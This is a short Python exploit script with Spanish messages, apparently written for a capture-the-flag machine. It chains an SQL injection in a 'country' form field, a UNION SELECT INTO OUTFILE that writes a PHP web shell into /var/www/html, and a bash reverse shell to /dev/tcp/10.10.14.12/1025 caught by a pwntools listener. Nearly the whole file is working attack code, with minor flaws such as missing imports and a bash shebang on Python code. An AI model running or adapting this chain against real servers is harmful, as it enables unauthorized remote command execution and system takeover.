#!/bin/bash

from pwn import *
import signal, pdb, requests


def def_handler(sig, frame):
    print("\n\nSaliendo del sistema!")
    sys.exit()

#ctrl + C
signal.signal(signal.SIGINT, def_handler)


if len(sys.argv) != 3:
    log.failure("Uso: %s <ip-addres> filename" % sys.argv[0])
    sys.exit()

#Variables

ip_address = sys.argv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address
lport = 1025


def createFile():
    data_post = {
            'username': 'aa',
            'country': """Brazil' union select "<?php system($_REQUEST['cmd']) ?>" into outfile "/var/www/html/%s";#""" % (filename)
            }
    
    r = requests.post(main_url, data=data_post)
    
def getAccess():

    data_post = {
        'cmd': "bash -c 'bash -i >& /dev/tcp/10.10.14.12/1025 0>&1'"
            }

    r = requests.post(main_url + "%s" % filename, data=data_post)

if __name__ == '__main__':

    createFile()
    

    try:

        threading.Thread(target=getAccess, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()
